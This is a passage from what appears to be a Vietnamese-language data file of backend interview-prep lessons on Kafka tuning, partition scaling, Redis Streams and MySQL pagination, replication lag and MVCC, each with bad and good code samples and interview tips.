    // Gọi API ngân hàng hoặc xuất hóa đơn PDF mất 1-2 giây / đơn:
    // 500 đơn x 1.5s = 750s (~12.5 phút) > 5 phút (max.poll.interval.ms)!
    // Coordinator lập tức coi Consumer đã chết và kích hoạt Rebalance Storm!
    paymentClient.processComplexSettlement(record.value());
}`,
        goodCodeTitle: '✅ Cấu hình CooperativeStickyAssignor & Giảm batch size an toàn',
        goodCode: `@Configuration
public class SafeKafkaConsumerConfig {
    @Bean
    public ConsumerFactory<String, Object> consumerFactory() {
        Map<String, Object> props = new HashMap<>();
        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        props.put(ConsumerConfig.GROUP_ID_CONFIG, "order-group");

        // 1. Giảm batch size xuống 50 tin để xử lý nhanh dưới 10 giây:
        props.put(ConsumerConfig.MAX_POLL_RECORDS_CONFIG, 50);

        // 2. Tăng thời gian chờ xử lý tối đa lên 10 phút:
        props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG, 600_000);

        // 3. Kích hoạt Cooperative Sticky Assignor: Loại bỏ Stop-The-World!
        props.put(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG,
                List.of(CooperativeStickyAssignor.class.getName()));

        return new DefaultKafkaConsumerFactory<>(props);
    }
}`,
        interviewTip: 'Phỏng vấn hỏi: "Sự khác biệt giữa heartbeat.interval.ms, session.timeout.ms và max.poll.interval.ms?". Trả lời rõ: "heartbeat.interval.ms và session.timeout.ms do một Background Thread riêng của Consumer gửi về Broker để báo máy ảo còn sống (liveness). Còn max.poll.interval.ms kiểm tra luồng chính (Main Processing Thread) có đang bận xử lý logic hay không. Một Consumer có thể gửi heartbeat đều đặn nhưng vẫn bị kick nếu luồng chính bị nghẽn không kịp gọi poll()!".'
      },
      {
        id: 'kafka-zero-copy-linux',
        title: '2. Linux Zero-Copy (sendfile) & OS Page Cache: Bí Mật Triệu Message/s Của Kafka',
        badge: 'Bản Chất Dưới Nắp Ca-pô',
        summary: 'Kafka không lưu message trong Java Heap mà ghi tuần tự vào đĩa và tận dụng Linux Page Cache kết hợp hàm sendfile() để gửi thẳng qua Network Card không tốn CPU.',
        explanation: `Nhiều bạn thắc mắc: "Tại sao Kafka viết bằng Java/Scala trên nền JVM mà lại có thể đạt thông lượng hàng triệu tin nhắn mỗi giây, nhanh hơn cả các broker viết bằng C/C++?".
Bí mật nằm ở **Kiến trúc Zero-Copy** và **Tối ưu hóa Kernel Linux**:

**1. Mô hình truyền thống (Traditional I/O) - Tốn 4 lần Copy và 4 lần Context Switch:**
Khi đọc dữ liệu từ file đĩa và gửi qua Socket mạng:
1. Đĩa cứng (Disk) copy dữ liệu vào **OS Page Cache** (qua DMA).
2. CPU copy dữ liệu từ OS Page Cache sang **User Space Buffer** của ứng dụng Java (Context Switch từ Kernel sang User).
3. Ứng dụng Java copy dữ liệu từ User Buffer sang **Socket Buffer** của Kernel (Context Switch từ User sang Kernel).
4. Socket Buffer copy dữ liệu sang bộ nhớ card mạng **NIC Buffer** (qua DMA) để phát ra cáp quang.
➔ **Hậu quả:** Tốn 4 lần sao chép bộ nhớ và 4 lần chuyển đổi ngữ cảnh CPU (User/Kernel mode switches)!

**2. Mô hình Linux Zero-Copy với hàm \`sendfile()\` trong Kafka:**
Kafka sử dụng phương thức \`FileChannel.transferTo()\` trong Java NIO, ánh xạ trực tiếp đến system call **\`sendfile()\`** của nhân Linux:
1. Đĩa cứng nạp dữ liệu vào **OS Page Cache** (DMA Copy).
2. Hàm \`sendfile()\` chỉ chuyển một **Descriptor (Con trỏ ô nhớ)** rất nhỏ sang Socket Buffer.
3. Card mạng (NIC) dùng cơ chế **Scatter-Gather DMA** để đọc trực tiếp dữ liệu từ OS Page Cache phát ra mạng!
➔ **Dữ liệu KHÔNG BAO GIỜ bị copy vào User Space của Java!**
➔ **Zero Memory Copy của CPU! Zero Garbage Collection rác trên Java Heap!**

**3. Tận dụng OS Page Cache & Sequential I/O (Ghi tuần tự):**
- Kafka ghi log dạng **Append-Only (Chỉ ghi nối đuôi)**. Ghi tuần tự trên đĩa HDD thường đạt tốc độ 600-800 MB/s, nhanh gần bằng ghi RAM ngẫu nhiên!
- Khi Producer gửi message vào và Consumer đọc ngay lập tức (Realtime streaming), dữ liệu vẫn đang nằm sẵn trong **Linux Page Cache của RAM**, Kafka không cần đọc lại từ đĩa vật lý một lần nào!`,
        asciiDiagram: `[TRUYỀN THỐNG (4 COPY, 4 CONTEXT SWITCH)]
[Đĩa] ──(1)──> [OS Page Cache] ──(2)──> [Java App Heap] ──(3)──> [Socket Buffer] ──(4)──> [Card Mạng NIC]

[KAFKA ZERO-COPY (sendfile + DMA)]
[Đĩa] ──(DMA)──> [OS Page Cache] ────────────────────────(DMA trực tiếp)───────────────────> [Card Mạng NIC]
                        │                                                                         ▲
                        └──(Chỉ gửi Descriptor con trỏ địa chỉ rất nhẹ)──> [Socket Buffer] ───────┘
                     (Dữ liệu KHÔNG BAO GIỜ đi vào Java Heap RAM ➔ Tốc độ ánh sáng!)`,
        badCodeTitle: '❌ Lầm tưởng Kafka chậm vì viết bằng Java và cố gắng tune JVM Heap thật to',
        badCode: `// ❌ SAI LẦM KHI CẤU HÌNH KAFKA BROKER:
// Cấp Heap 64GB cho Kafka Broker JVM:
export KAFKA_HEAP_OPTS="-Xms64G -Xmx64G"
// Hậu quả: JVM bị GC Pause Stop-The-World kéo dài hàng chục giây!
// Trong khi Kafka cần RAM cho Linux OS Page Cache chứ KHÔNG CẦN Java Heap to!`,
        goodCodeTitle: '✅ Chuẩn cấu hình Big Tech: JVM Heap 4-6GB, để lại 90% RAM cho Page Cache',
        goodCode: `# ✅ CẤU HÌNH CHUẨN PRODUCTION CHO KAFKA BROKER (Máy 64GB RAM):
# 1. JVM Heap chỉ cần 4GB đến 6GB (chỉ chứa metadata và socket connections):
export KAFKA_HEAP_OPTS="-Xms6G -Xmx6G -XX:+UseG1GC"

# 2. Để lại 58GB RAM còn lại cho Linux OS Page Cache!
# Toàn bộ message của các topic sẽ được Linux đệm trực tiếp trên Page Cache,
# sendfile() đọc thẳng từ Page Cache sang Network Card với tốc độ Bus RAM!`,
        interviewTip: 'Khi phỏng vấn hỏi: "Trong trường hợp nào tính năng Zero-Copy của Kafka bị vô hiệu hóa?", trả lời chuẩn Senior: "Khi Kafka Broker bật tính năng mã hóa đường truyền SSL/TLS hoặc Message Transformation/Compression tại cấp độ Broker. Khi có SSL, Broker buộc phải kéo dữ liệu vào User Space của JVM để mã hóa bằng CPU rồi mới gửi đi được, làm mất lợi thế Zero-Copy. Do đó trên mạng nội bộ riêng tư (Private Subnet/VPC), các công ty thường tắt TLS giữa Broker-Consumer để giữ trọn vẹn sức mạnh Zero-Copy".'
      },
      {
        id: 'kafka-scale-partition-performance',
        title: '3. Scale Partitions Tăng Hiệu Năng Gấp 3 Lần & Cạm Bẫy Đảo Lộn Thứ Tự',
        badge: 'Kỹ Năng Scale Hệ Thống',
        summary: '1 Partition chỉ phục vụ tối đa 1 Consumer trong Group. Tăng Partition là chìa khóa tăng thông lượng, nhưng nếu tăng lúc đang chạy sẽ làm đảo lộn thứ tự băm Murmur2.',
        explanation: `Trong Kafka, đơn vị song song hóa (Parallelism Unit) là **Partition**:
1. **Quy tắc vàng 1-1 giữa Partition và Consumer:**
   - Trong cùng một Consumer Group, **một Partition chỉ có thể được tiêu thụ bởi DUY NHẤT một Consumer Instance** tại một thời điểm!
   - Nếu Topic chỉ có **3 Partitions**, nhưng bạn mở rộng deploy **10 Pods Consumer**:
     - 3 Pods sẽ được phân bổ 3 Partitions để làm việc.
     - **7 Pods còn lại sẽ ngồi chơi xơi nước (Idle hoàn toàn)!**
   - ➔ Muốn xử lý dữ liệu nhanh gấp 3 lần, bạn bắt buộc phải **TĂNG SỐ LƯỢNG PARTITION** lên tương ứng!

2. **Cạm bẫy sống còn khi tăng Partition lúc đang chạy trên Production:**
   - Kafka mặc định dùng thuật toán băm **Murmur2** để chia Partition:
     \`target_partition = murmur2(key) % total_partitions\`
   - **Kịch bản gãy thứ tự nghiệp vụ:**
     - Ban đầu topic có 3 partitions ($P_0, P_1, P_2$). Đơn hàng ID = 100 có \`murmur2(100) % 3 = 1\` ➔ Sự kiện \`ORDER_CREATED\` được gửi vào $P_1$.
     - Bạn tăng số lượng partition lên 6 ($P_0$ đến $P_5$).
     - Vài giây sau, đơn hàng ID = 100 phát sinh sự kiện \`ORDER_PAID\`. Lúc này công thức băm là: \`murmur2(100) % 6 = 4\` ➔ \`ORDER_PAID\` bay vào **$P_4$**!
     - **HẬU QUẢ:** Consumer của $P_4$ chạy nhanh hơn xử lý \`ORDER_PAID\` trước khi Consumer của $P_1$ kịp tạo đơn hàng ➔ Dữ liệu bị vỡ nát!

3. **Chiến lược an toàn khi tăng Partitions:**
   - Không tăng Partition tùy tiện trong giờ cao điểm.
   - Nếu bắt buộc tăng: Hoặc xả cạn lag cũ trước, hoặc sử dụng **Custom Partitioner** cố định số lượng partition băm ban đầu.`,
        asciiDiagram: `[BAN ĐẦU: 3 PARTITIONS]
murmur2("order_99") % 3 = 0 ──> Bay vào Partition 0 [CREATED Event]

[TĂNG LÊN 6 PARTITIONS GIỮA CHỪNG]
murmur2("order_99") % 6 = 3 ──> Bay vào Partition 3 [CANCELLED Event]

Consumer P3 đọc trước ──> CANCEL một đơn hàng CHƯA ĐƯỢC TẠO TRÊN DB! 💥`,
        badCodeTitle: '❌ Tăng số lượng Consumer Pods nhưng không tăng Partitions',
        badCode: `# ❌ VÔ NGHĨA KHI SCALE TRÊN KUBERNETES:
# Topic "orders" chỉ cấu hình 3 Partitions trong Kafka Cluster!
apiVersion: apps/v1
kind: Deployment
metadata:
  name: order-consumer-service
spec:
  replicas: 10 # ❌ 7 Pods ngồi chơi xơi nước, thông lượng không tăng 1 chút nào!`,
        goodCodeTitle: '✅ Scale đồng bộ Partitions và Consumer Replicas',
        goodCode: `# 1. Tăng số Partition của Topic trước khi scale ứng dụng:
kafka-topics.sh --bootstrap-server localhost:9092 --alter \
    --topic orders --partitions 10

# 2. Sau đó mới scale 10 Pod Consumer tương ứng:
kubectl scale deployment order-consumer-service --replicas=10
# Lúc này cả 10 Pods đều được nhận đúng 1 Partition riêng biệt, thông lượng tăng vọt x3.3 lần!`,
        interviewTip: 'Người phỏng vấn hỏi: "Một Topic có thể tạo 10,000 Partitions để chạy cho nhanh không?". Trả lời: "Không nên! Quá nhiều Partitions sẽ làm chậm quá trình Leader Election khi một Broker bị crash (mất vài phút mới bầu xong), tốn bộ nhớ RAM để duy trì partition index, và làm tăng End-to-End Latency của Producer vì batch buffer bị phân tán thành quá nhiều mảnh nhỏ". Con số khuyến nghị thông thường là 6 - 30 partitions cho mỗi topic.'
      },
      {
        id: 'kafka-vs-redis-streams',
        title: '4. Khi Nào Nên Dùng Redis Streams Thay Vì Dựng Cụm Kafka Cồng Kềnh?',
        badge: 'Lựa Chọn Công Nghệ Tinh Gọn',
        summary: 'Kafka mạnh mẽ nhưng vận hành cực kỳ phức tạp (KRaft/Zookeeper, RAM, Đĩa). Redis Streams cung cấp Consumer Group, ACK, XADD gọn nhẹ cho hệ thống vừa và nhỏ.',
        explanation: `Trong các buổi thảo luận kiến trúc, nhiều kỹ sư mắc bệnh "dùng dao mổ trâu để giết gà":
Một dự án chỉ có 2,000 đơn hàng mỗi ngày nhưng vẫn dựng cả một cụm Apache Kafka 3 Broker cồng kềnh, tốn hàng chục triệu tiền server AWS mỗi tháng chỉ để chạy Zookeeper/KRaft và tốn công bảo trì.

Từ Redis 5.0+, Redis ra mắt kiểu dữ liệu **Redis Streams**:
- Hoạt động tương tự như một bản Kafka Log thu nhỏ: Hỗ trợ cấu trúc Append-Only Log.
- Cung cấp **Consumer Groups, Pending Entries List (PEL), Message ID (Timestamp-Seq), và cơ chế xác nhận ACK** tương đương Kafka!

**Bảng so sánh quyết định kiến trúc từ kênh:**
| Tiêu chí | Redis Streams | Apache Kafka |
| :--- | :--- | :--- |
| **Hạ tầng cần dựng** | Tận dụng ngay cụm Redis có sẵn | Cụm Kafka Brokers + KRaft controller |
| **Chi phí vận hành** | Rất thấp, cấu hình đơn giản | Phức tạp, cần chuyên gia DevOps/SRE |
| **Dung lượng lưu trữ** | Bị giới hạn bởi RAM (hoặc dùng MAXLEN) | Lưu hàng Terabyte trên đĩa cứng (Retention Days) |
| **Thông lượng (Throughput)** | 50,000 - 100,000 msg/s | Hàng triệu msg/s (Zero-Copy) |
| **Replay dữ liệu lịch sử** | Kém (thường cắt tỉa dữ liệu cũ) | Xuất sắc (có thể reset offset đọc lại 1 năm trước) |

**Khi nào nên chọn Redis Streams?**
- Hệ thống Microservices quy mô vừa và nhỏ (dưới 50,000 sự kiện/s).
- Không cần lưu trữ lịch sử tin nhắn nhiều năm (dùng lệnh \`XADD mystream MAXLEN ~ 100000 *\`).
- Dự án đã có sẵn Redis, muốn tiết kiệm chi phí hạ tầng và đưa tính năng lên production nhanh nhất.`,
        asciiDiagram: `[KHI NÀO CHỌN GÌ?]
Quy mô sự kiện < 50,000/s + Đã có Redis ─────> [DÙNG REDIS STREAMS (Gọn, Rẻ, Xong ngay!)] ✅
Quy mô > 500,000/s + Lưu log 30 ngày ─────────> [DÙNG APACHE KAFKA (Bền bỉ, Chuyên sâu)] ✅`,
        badCodeTitle: '❌ Dựng cả cụm Kafka cồng kềnh chỉ cho các tác vụ thông báo nội bộ đơn giản',
        badCode: `// ❌ OVER-ENGINEERING KHI DỰ ÁN MỚI KHỞI NGHIỆP:
// Chỉ có 100 người dùng nhưng phải gánh chi phí 3 cụm máy chủ Kafka chạy tốn điện!
@Autowired private KafkaTemplate<String, String> kafka;`,
        goodCodeTitle: '✅ Triển khai Redis Streams với Spring Data Redis tinh gọn',
        goodCode: `@Service
@RequiredArgsConstructor
public class RedisStreamOrderService {
    private final StringRedisTemplate redisTemplate;

    // Bắn sự kiện vào Redis Streams (O(1) trên RAM):
    public RecordId publishOrderCreated(String orderId, String payload) {
        ObjectRecord<String, String> record = StreamRecords.newRecord()
                .ofObject(payload)
                .withStreamKey("stream:orders");
        return redisTemplate.opsForStream().add(record);
    }
}

// Consumer lắng nghe theo Consumer Group có ACK:
@Component
public class OrderStreamListener implements StreamListener<String, MapRecord<String, String, String>> {
    @Override
    public void onMessage(MapRecord<String, String, String> message) {
        log.info("Xử lý message từ Redis Stream: id={} | value={}", message.getId(), message.getValue());
        // Sau khi xử lý xong thì gửi lệnh ACK:
        // redisTemplate.opsForStream().acknowledge("stream:orders", "order-group", message.getId());
    }
}`,
        interviewTip: 'Câu hỏi kinh điển: "Nếu so sánh Redis Pub/Sub và Redis Streams thì khác nhau điểm cốt lõi nào?". Trả lời: "Redis Pub/Sub là Fire-and-forget: nếu không có Subscriber nào đang online lúc đó thì message bị mất vĩnh viễn, không có lưu vết, không có ACK. Còn Redis Streams có lưu trữ dữ liệu vào Append-Only Log, có Consumer Groups để chia tải, và duy trì danh sách tin nhắn chưa ACK (Pending Entries List) để retry khi worker bị sập".'
      }
    ]
  },
  {
    id: 'mysql-database-internals',
    title: 'MySQL Tối Ưu Bảng 10 Triệu Dòng & MVCC',
    icon: '🗄️',
    accentColor: '#10b981',
    tagline: 'Tối ưu hóa Database cấp Senior từ: Deferred Join phân trang 10M dòng từ 7s về 0.3s, Khắc phục Master-Slave Replication Lag, MVCC & Virtual Threads HikariCP',
    topics: [
      {
        id: 'mysql-deferred-join-pagination',
        title: '1. Tối Ưu Phân Trang Bảng 10 Triệu Dòng Từ 7s Xuống 0.3s Bằng Deferred Join',
        badge: 'Tuyệt Kỹ Database Triệu Dòng',
        summary: 'LIMIT 1000000, 20 cực chậm vì MySQL phải đọc 1,000,020 dòng từ ổ đĩa rồi vứt bỏ 1,000,000 dòng. Dùng Deferred Join với Covering Index để tăng tốc gấp 20 lần.',
        explanation: `Trên các hệ thống lớn (E-commerce, Log Viewer), tính năng phân trang (Pagination) trên bảng có hàng chục triệu bản ghi là nơi bộc lộ rõ nhất trình độ của Senior:
Giả sử người dùng bấm xem trang thứ 50,000:
\`SELECT * FROM orders ORDER BY id LIMIT 1000000, 20;\`

**1. Tại sao câu lệnh trên mất tận 7 - 10 giây?**
- Để lấy 20 bản ghi ở vị trí thứ 1 triệu:
  - MySQL buộc phải nạp toàn bộ **1,000,020 bản ghi đầy đủ (Full Row Data)** từ đĩa vào RAM!
  - Sau đó MySQL ngậm ngùi **vứt bỏ 1,000,000 bản ghi đầu tiên**, chỉ giữ lại đúng 20 bản ghi cuối cùng để trả về!
  - Việc đọc 1 triệu hàng dữ liệu khổng lồ từ ổ đĩa (kể cả SSD) tốn rất nhiều I/O ngẫu nhiên và chiếm hết Buffer Pool của InnoDB!

**2. Giải pháp 1: Kỹ thuật Deferred Join (Liên kết trì hoãn - Khuyên dùng):**
- Thay vì nạp toàn bộ các cột của 1 triệu dòng, ta dùng một Subquery chỉ đọc cột khóa chính **\`id\`** dựa trên **Covering Index**:
  \`SELECT t.* FROM orders t JOIN (SELECT id FROM orders ORDER BY id LIMIT 1000000, 20) sub ON t.id = sub.id;\`
- **Cơ chế tăng tốc:**
  - Subquery \`SELECT id FROM orders ORDER BY id LIMIT 1000000, 20\` chỉ quét trên B-Tree Index (nhẹ và nhỏ hơn 100 lần so với nạp cả bảng).
  - MySQL chỉ cần truy cập ổ đĩa để đọc đầy đủ thông tin cho **ĐÚNG 20 BẢN GHI CUỐI CÙNG** thông qua lệnh JOIN!
  - ➔ **Thời gian chạy giảm từ 7.5 giây xuống chỉ còn 0.25 giây (nhanh gấp 30 lần)!**

**3. Giải pháp 2: Keyset Pagination (Seek Method - Tối ưu tuyệt đối):**
- Không dùng số trang (Page Number) mà dùng ID của bản ghi cuối cùng nhìn thấy:
  \`SELECT * FROM orders WHERE id > :last_seen_id ORDER BY id ASC LIMIT 20;\`
- Tốc độ luôn luôn là $O(1)$ (dưới 2ms) bất kể bạn đang ở bản ghi thứ 1 hay bản ghi thứ 100 triệu!`,
        asciiDiagram: `[CÁCH TRUYỀN THỐNG ➔ NẠP 1 TRIỆU BẢN GHI ĐẦY ĐỦ RỒI VỨT BỎ (7s)]
[Đọc 1,000,020 rows từ ĐĨA] ──> [Vứt bỏ 1,000,000 rows] ──> Giữ lại 20 rows! (Quá chậm ❌)

[DEFERRED JOIN ➔ CHỈ QUÉT B-TREE INDEX RỒI JOIN ĐÚNG 20 ROWS (0.2s)]
[Subquery: Quét ID trên Index] ──(Siêu nhanh 0.1s)──> Lấy ra đúng 20 IDs [1000001 ... 1000020]
                                                              │
[JOIN với bảng chính đọc 20 dòng đầy đủ] <─────────────────────┘ (Chỉ đọc đúng 20 rows! ✅)`,
        badCodeTitle: '❌ Phân trang truyền thống bằng PageRequest trong Spring Data JPA',
        badCode: `// ❌ CHẬM KHI SỐ TRANG LỚN (page = 50000):
// Sinh ra: SELECT * FROM orders ORDER BY id LIMIT 1000000, 20
Pageable pageable = PageRequest.of(page, 20, Sort.by("id"));
Page<Order> orders = orderRepository.findAll(pageable); // Chạy 8 giây làm đơ giao diện!`,
        goodCodeTitle: '✅ Native Query áp dụng kỹ thuật Deferred Join thần tốc',
        goodCode: `public interface OrderRepository extends JpaRepository<Order, Long> {
    // ✅ DEFERRED JOIN: Quét ID trên Index trước rồi JOIN lấy dữ liệu:
    @Query(value = """
        SELECT o.* FROM orders o
        INNER JOIN (
            SELECT id FROM orders 
            WHERE status = :status 
            ORDER BY id ASC 
            LIMIT :offset, :limit
        ) sub ON o.id = sub.id
    """, nativeQuery = true)
    List<Order> findOrdersDeferred(
            @Param("status") String status,
            @Param("offset") long offset,
            @Param("limit") int limit
    );

    // ✅ HOẶC KEYSET PAGINATION (TỐC ĐỘ 2MS):
    @Query("SELECT o FROM Order o WHERE o.id > :lastId ORDER BY o.id ASC LIMIT :limit")
    List<Order> findNextPageKeyset(@Param("lastId") Long lastId, @Param("limit") int limit);
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Khi nào không thể áp dụng Keyset Pagination mà buộc phải dùng Deferred Join?", trả lời: "Keyset Pagination (WHERE id > lastId) chỉ dùng được cho trải nghiệm Infinite Scrolling (cuộn vô tận như Facebook/Tiktok) hoặc nút Xem Thêm. Nếu giao diện của người dùng yêu cầu người ta có thể bấm nhảy cóc trực tiếp đến Trang 50 hoặc Trang 200 bất kỳ, ta bắt buộc phải dùng kỹ thuật Deferred Join".'
      },
      {
        id: 'mysql-replication-lag-sticky',
        title: '2. Khắc Phục Lỗi Trễ Đồng Bộ Master-Slave (Replication Lag): Vừa Đăng Không Thấy Bài',
        badge: 'Sự Cố Kinh Điển Khi Scale DB',
        summary: 'Tách Database Master (Ghi) và Slave (Đọc). Khách vừa đăng status nhấn F5 lại không thấy bài vì Slave chưa kịp sao chép từ Master. Khắc phục bằng Sticky Master Routing.',
        explanation: `Khi hệ thống phình to, ta thường áp dụng kiến trúc **Read-Write Splitting (Phân tách Đọc - Ghi)**:
- **Master Node:** Chuyên tiếp nhận các lệnh ghi (\`INSERT\`, \`UPDATE\`, \`DELETE\`).
- **Slave / Read-Replica Nodes:** Chuyên tiếp nhận các lệnh đọc (\`SELECT\`) để giảm tải cho Master.

**Hiện tượng Replication Lag (Trễ sao chép) sinh ra bug nghiệp vụ:**
1. MySQL đồng bộ từ Master sang Slave theo cơ chế **Bất đồng bộ (Asynchronous Replication)** qua Binlog.
2. Quá trình sao chép này thường có độ trễ từ **100ms đến 2 giây** (nếu Slave đang bận thì có thể trễ cả chục giây).
3. **Kịch bản lỗi người dùng:**
   - User A bấm "Đăng bài viết mới" ➔ Request ghi chạy vào **Master DB** thành công.
   - Trình duyệt ngay lập tức chuyển hướng hoặc người dùng bấm F5 để xem lại bài ➔ Request đọc lại được định tuyến vào **Slave DB**!
   - Vì Slave chưa kịp nạp binlog từ Master ➔ **Không tìm thấy bài viết!**
   - User tưởng mình bị lỗi nên bấm đăng tiếp lần 2 ➔ Sinh ra bài viết rác trùng lặp!

**3 Giải pháp chuẩn Big Tech giải quyết triệt để:**
1. **Sticky Master Routing (Khuyên dùng):**
   - Khi một người dùng vừa thực hiện hành vi GHI, hệ thống lưu một cờ vào Session/Cookie/Redis: \`user:master:routing:userId = 1\` với TTL = 3 đến 5 giây.
   - Trong vòng 5 giây đó, **toàn bộ request ĐỌC của riêng người dùng đó sẽ được ưu tiên gửi thẳng về Master DB**!
   - Sau 5 giây, Slave đã đồng bộ xong thì lại quay về đọc Slave bình thường.
2. **Đọc theo vai trò (Role-based Routing):**
   - Các hành vi quan trọng (như màn hình Checkout, màn hình Profile cá nhân của chính mình) ➔ Luôn đọc từ Master.
   - Các màn hình đọc chung (bảng tin công cộng, danh sách sản phẩm) ➔ Đọc từ Slave.
3. **Semi-Synchronous Replication:**
   - Cấu hình MySQL chỉ commit khi ít nhất 1 node Slave đã nhận được binlog vào Relay Log. (Nhược điểm: Làm chậm tốc độ ghi của Master đi một chút).`,
        asciiDiagram: `[LỖI REPLICATION LAG]
User ──(1. INSERT bài viết)──> [Master DB: Đã lưu bài #99]
  │                                   │
  │ (F5 đọc lại sau 50ms)             ▼ (Binlog đang truyền... trễ 500ms!)
  └───────(2. SELECT bài #99)───────> [Slave DB: CHƯA CÓ BÀI #99!] ➔ BÁO LỖI 404! 💥

[GIẢI PHÁP: STICKY MASTER ROUTING TRONG 5 GIÂY]
Vừa GHI xong ──> Set cờ: "User A vừa ghi, trong 5s tới đọc thẳng từ Master!"
F5 đọc lại ──────> [Định tuyến thẳng về Master DB: Tìm thấy bài #99 ngay lập tức!] ✅`,
        badCodeTitle: '❌ Định tuyến ngẫu nhiên khiến vừa ghi xong đọc lại thấy rỗng',
        badCode: `// ❌ LỖI NGHIỆP VỤ KHI DÙNG @Transactional(readOnly = true):
@Transactional
public Post createPost(PostRequest req) {
    return postRepository.save(new Post(req)); // Ghi vào Master
}

@Transactional(readOnly = true)
public Post getPost(Long id) {
    // Luôn bị Spring Routing DataSource đẩy sang Slave DB!
    // Vừa createPost xong gọi getPost ngay -> Ném EntityNotFoundException!
    return postRepository.findById(id).orElseThrow();
}`,
        goodCodeTitle: '✅ Định tuyến thông minh bằng ThreadLocal Dynamic DataSource',
        goodCode: `public class RoutingDataSourceContext {
    private static final ThreadLocal<String> CONTEXT = new ThreadLocal<>();

    public static void setMasterOnly() { CONTEXT.set("MASTER"); }
    public static void clear() { CONTEXT.remove(); }
    public static boolean isMaster() { return "MASTER".equals(CONTEXT.get()); }
}

@Service
@RequiredArgsConstructor
public class SmartPostService {
    private final PostRepository postRepo;
    private final StringRedisTemplate redisTemplate;

    public Post getPostSmart(Long id, Long currentUserId) {
        // Kiểm tra xem User này có vừa đăng bài trong 5 giây qua không:
        Boolean isRecentlyWritten = redisTemplate.hasKey("write_flag:" + currentUserId);
        
        if (Boolean.TRUE.equals(isRecentlyWritten)) {
            // ✅ ĐỌC TỪ MASTER TRONG 5S ĐẦU:
            RoutingDataSourceContext.setMasterOnly();
        }

        try {
            return postRepo.findById(id).orElseThrow();
        } finally {
            RoutingDataSourceContext.clear();
        }
    }
}`,
        interviewTip: 'Người phỏng vấn hỏi: "Ngoài cách dùng Redis Flag 5s, trong MySQL có cơ chế nào để Slave biết nó đã đồng bộ kịp hay chưa?". Trả lời: "Dùng cơ chế GTID (Global Transaction Identifier). Khi Master ghi xong trả về gtid_executed, client cầm mã GTID đó gửi kèm request đọc, Slave sẽ dùng hàm WAIT_FOR_EXECUTED_GTID_SET(gtid, timeout) để chờ Slave nạp kịp vị trí GTID đó rồi mới trả về dữ liệu, đảm bảo đọc dữ liệu mới 100%".'
      },
      {
        id: 'mysql-mvcc-undo-log',
        title: '3. Cơ Chế MVCC & Read View Trong InnoDB: Tại Sao SELECT Không Bao Giờ Chờ UPDATE?',
        badge: 'Cơ Chế Cốt Lõi InnoDB',
        summary: 'Tại sao câu lệnh SELECT không bao giờ bị khóa bởi câu lệnh UPDATE trong MySQL? Hiểu rõ Undo Log, Transaction ID (trx_id), Roll Pointer và Read View.',
        explanation: `Trong các hệ quản trị CSDL cũ, khi có một luồng đang \`UPDATE\` một hàng, nó sẽ chiếm Exclusive Lock (X-Lock), khiến cho tất cả các luồng \`SELECT\` đọc hàng đó **đều bị block và phải xếp hàng chờ đợi**.
MySQL InnoDB giải quyết triệt để vấn đề này bằng cơ chế **MVCC (Multi-Version Concurrency Control - Kiểm soát đồng thời đa phiên bản)**:
*Nguyên tắc vàng: "Đọc không chặn Ghi, Ghi không chặn Đọc"!*

**1. Cấu trúc ẩn của một hàng trong InnoDB:**
Mỗi bản ghi trong bảng InnoDB ngoài các cột dữ liệu thông thường còn có **3 trường ẩn**:
- **\`DB_TRX_ID\` (6 bytes):** Lưu ID của Transaction cuối cùng thực hiện chèn hoặc sửa đổi dòng này.
- **\`DB_ROLL_PTR\` (7 bytes):** Con trỏ trỏ tới bản ghi lịch sử tương ứng trong **Undo Log** (tạo thành một chuỗi danh sách liên kết phiên bản cũ - Version Chain).
- **\`DB_ROW_ID\` (6 bytes):** Khóa chính ẩn nếu bảng không khai báo Primary Key.

**2. Cơ chế Read View (Ảnh chụp phiên bản):**
Khi một Transaction chạy câu lệnh \`SELECT\` ở mức **Repeatable Read (RR)**:
- InnoDB tạo ra một **Read View** bao gồm:
  - Danh sách các transaction ID đang hoạt động (chưa commit) tại thời điểm đó: \`m_ids\`.
  - ID transaction nhỏ nhất đang hoạt động: \`min_trx_id\`.
  - ID transaction tiếp theo sẽ sinh ra: \`max_trx_id\`.
- **Quy tắc khả kiến (Visibility Rule):**
  - Nếu một dòng có \`DB_TRX_ID < min_trx_id\` ➔ Đã commit trước khi tôi đọc ➔ **Tôi nhìn thấy!**
  - Nếu \`DB_TRX_ID >= max_trx_id\` ➔ Sinh ra sau khi tôi bắt đầu ➔ **Tôi không được nhìn thấy!**
  - Nếu \`DB_TRX_ID\` nằm trong khoảng giữa và thuộc \`m_ids\` (chưa commit) ➔ **Tôi không được nhìn thấy!** ➔ Đi theo con trỏ \`DB_ROLL_PTR\` lùi về Undo Log để tìm phiên bản dữ liệu cũ hơn đã commit hợp lệ!

**3. Hiểm họa Long-running Transactions (Transaction chạy quá lâu):**
- Nếu một transaction mở ra mà quên commit/rollback (treo hàng tiếng đồng hồ):
- InnoDB buộc phải giữ lại toàn bộ chuỗi Undo Log lịch sử cho transaction đó đọc ➔ **Không thể dọn rác (Purge Thread bị nghẽn)**.
- File \`ibdata1\` hoặc dung lượng ổ đĩa phình to hàng trăm Gigabytes, làm chậm toàn bộ hệ thống!`,
        asciiDiagram: `[CHUỖI PHIÊN BẢN (VERSION CHAIN) QUA UNDO LOG]
Bản ghi hiện tại: [User: Nam | Tuổi: 30 | DB_TRX_ID: 200]
                             │
                             ▼ (DB_ROLL_PTR)
Undo Log Version 1: [User: Nam | Tuổi: 25 | DB_TRX_ID: 150]
                             │
                             ▼ (DB_ROLL_PTR)
Undo Log Version 2: [User: Nam | Tuổi: 20 | DB_TRX_ID: 100]

-> Transaction 120 vào SELECT: Thấy TRX 200 và 150 chưa commit với mình
-> Tự động lùi theo con trỏ đọc bản ghi TRX 100 (Tuổi = 20) trong Undo Log!
-> SELECT đọc cực nhanh, KHÔNG HỀ BỊ KHÓA bởi lệnh UPDATE của TRX 200! ✅`,
        badCodeTitle: '❌ Mở Transaction kéo dài chạy kèm logic gọi mạng làm phình Undo Log',
        badCode: `@Transactional
public void processLargeReport() {
    // ❌ TRANSACTION MỞ HÀNG TIẾNG ĐỒNG HỒ:
    List<User> users = userRepo.findAll();
    for (User u : users) {
        // Gọi API bên thứ 3 chậm chạp 2 giây / lần:
        externalService.sendEmailNotification(u); // Giữ connection & lock Undo Log!
